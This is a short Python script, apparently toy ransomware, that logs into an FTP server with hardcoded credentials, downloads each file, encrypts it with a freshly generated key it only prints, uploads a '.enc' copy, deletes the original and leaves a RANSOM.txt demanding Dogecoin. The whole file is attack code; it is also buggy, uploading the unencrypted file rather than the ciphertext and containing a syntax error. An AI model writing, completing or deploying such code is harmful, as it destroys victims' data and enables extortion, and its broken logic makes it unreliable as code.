import os
from ftplib import FTP
import base64
from cryptography.fernet import Fernet
import io

host = "192.168.50.116"
port = 21
my_ftp = FTP()
my_ftp.connect(host,port)
my_ftp.login("ftpadmin","password123")
my_ftp.retrlines('LIST')

filenames = my_ftp.nlst()  #get filenames within the directory
print(filenames)

for filename in filenames:
	local_filename = os.path.join('', filename)
	file = open(local_filename, 'wb+')
	my_ftp.retrbinary('RETR ' + filename, file.write)
	print(filename)
	file.seek(0)
	c = file.read()
	e = base64.b64encode(c)
	key = Fernet.generate_key()
	print(key.decode())
	message = c
	e = Fernet(key).encrypt(message)
	print(c,e)
	file.seek(0)
	file.write(0)
	file.seek(0)
	my_ftp.storbinary("STOR {}".format(filename+'.enc'), file)
	my_ftp.delete(filename)
	file.close()
f = io.BytesIO(b 'PLS SEND DOGECOIN TO XXXXXXX@XXX.XX')
my_ftp.storbinary("STOR {}".format('RANSOM.txt'), f)
